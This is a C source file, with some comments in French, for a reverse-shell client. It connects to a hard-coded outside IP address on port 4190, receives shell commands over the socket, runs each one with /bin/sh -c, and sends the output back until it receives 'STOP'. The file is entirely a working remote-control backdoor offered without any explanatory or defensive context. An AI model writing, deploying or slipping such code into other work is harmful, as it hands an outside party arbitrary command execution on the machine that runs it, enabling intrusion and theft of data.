#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h>



#define LPORT 4190
#define LHOST "212.227.28.186"
#define BUFFLEN 1024

int checkEnd(char* buffer, size_t size){
  if (size<1){
    return 1;
  }

  if (buffer[size-1]=='\n'){
    return 0;
  }
  return 1;



}

int exec_command(const char *cmd, char **output, size_t *out_size) {
    int pipefd[2];
    pid_t pid;
    *output = NULL;
    size_t size = 0;

    if (pipe(pipefd) == -1) {
        perror("pipe");
        return -1;
    }

    pid = fork();
    if (pid == -1) {
        perror("fork");
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (pid == 0) {
        // Processus enfant
        close(pipefd[0]);                // Ferme lecture du pipe
        dup2(pipefd[1], STDOUT_FILENO);   // Redirige stdout vers pipe
        close(pipefd[1]);

        char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};
        execvp(argv[0], argv);
        perror("execvp");
        _exit(1);
    } else {
        // Processus parent
        close(pipefd[1]);

        char buf[1024];
        ssize_t bytes;
        while ((bytes = read(pipefd[0], buf, sizeof(buf))) > 0) {
            char *tmp = realloc(*output, size + bytes + 1);
            if (!tmp) {
                perror("realloc");
                free(*output);
                close(pipefd[0]);
                waitpid(pid, NULL, 0);
                return -1;
            }
            *output = tmp;
            memcpy(*output + size, buf, bytes);
            size += bytes;
            (*output)[size] = '\0';
        }

        close(pipefd[0]);
        int status;
        waitpid(pid, &status, 0);
        if (out_size) {
            *out_size = size;
        }
        return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
    }
}

int iterationLoop(int sockfd){
  char* cmd = (char*)malloc(BUFFLEN); //buffer storing the entire command line
  char* chunk = (char*)malloc(BUFFLEN); //buffer storing the chunk
  char* retValue = (char*)malloc(BUFFLEN);
  size_t retSize = 0;
  int end = 0; //Value stoping the iteration loop 
  int out = 0;
  int bRead = 0;
  size_t cmdLen = 0; //size of the effective element in the "cmd" Buffer
  
  while(!end){//watching the END flag
    bRead = read(sockfd, chunk, BUFFLEN);
    if (bRead <= 0) {
        fprintf(stderr, "Nothing was received\n");
        out += 1;
        goto _GracefullEnd;
    }

    if (bRead == 5 && strncmp(chunk, "STOP\n", 5) == 0) {
        end = 1;
        continue;
    }

    memcpy(cmd, chunk, bRead);
    cmdLen = bRead;

    while (checkEnd(cmd, cmdLen)) {
        bRead = read(sockfd, chunk, BUFFLEN);
        if (bRead <= 0) {
            perror("Read error or connection closed");
            out += 1;
            goto _GracefullEnd;
        }

        char *new_cmd = realloc(cmd, cmdLen + bRead);
        if (!new_cmd) {
            perror("realloc failed");
            out += 1;
            goto _GracefullEnd;
        }
        cmd = new_cmd;

        memcpy(cmd + cmdLen, chunk, bRead);
        cmdLen += bRead;
    }
    if (exec_command(cmd,&retValue,&retSize)!=0){
      perror("exec_command");
      out+=1;
      goto _GracefullEnd;
    }

    write(sockfd,retValue,retSize);

    cmdLen = 0; // prêt pour la commande suivante

  }
  printf("Client has been Gracefully ShutDown\n");

_GracefullEnd:
  free(chunk);
  free(cmd);
  return out;
}


int main(){

  int sockfd, connfd = 0;
  struct sockaddr_in addr = {0};
  socklen_t addrlen = sizeof(addr);

  if ((sockfd = socket(AF_INET,SOCK_STREAM,0))<0){
    perror("failed to create socket");
    return -1;

  }
  addr.sin_family = AF_INET;
  addr.sin_port = htons(LPORT);

  if ((inet_pton(AF_INET,LHOST,&addr.sin_addr))<0){
    perror("failed to initialize sin_addr struct");
    return -1;
  }

  if (connect(sockfd,(struct sockaddr*)(&addr),sizeof(addr))<0){
    perror("failed to connect");
    return -1;
  }

  printf("[+] Connected [+]\n");

  iterationLoop(sockfd);

  close(sockfd);
  return 0;

}
